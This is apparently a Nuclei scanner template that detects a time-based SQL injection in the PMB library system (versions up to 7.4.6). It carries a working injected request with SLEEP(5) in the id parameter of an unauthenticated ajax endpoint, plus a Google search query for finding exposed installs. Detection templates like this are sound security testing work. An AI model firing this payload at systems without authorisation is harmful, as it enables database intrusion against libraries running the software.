http:
- matchers:
  - condition: and
    dsl:
    - contains(content_type, "text/html")
    - contains(header, "PmbOpac")
    - duration>=5
    - status_code == 200
    type: dsl
  raw:
  - '@timeout: 15s

    GET /pmb/opac_css/ajax.php?categ=storage&datetime=undefined&id=1%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))SHde)&module=ajax&sub=save&token=undefined
    HTTP/2

    Host: {{Hostname}}

    '
id: pmb-sqli
info:
  author: r3Y3r53
  description: 'PMB is a completely free ILS (Integrated Library management System).
    The domain of software for libraries is almost exclusively occupied by proprietary
    products. We are some librarians, users and developers deploring this state of
    affairs.

    '
  metadata:
    google-query: inurl:"opac_css"
    max-request: 1
    verified: true
  name: PMB <= 7.4.6 - SQL Injection
  reference:
  - https://www.exploit-db.com/exploits/51197
  - https://vulners.com/exploitdb/EDB-ID:51197
  severity: high
  tags: sqli,unauth,pmb
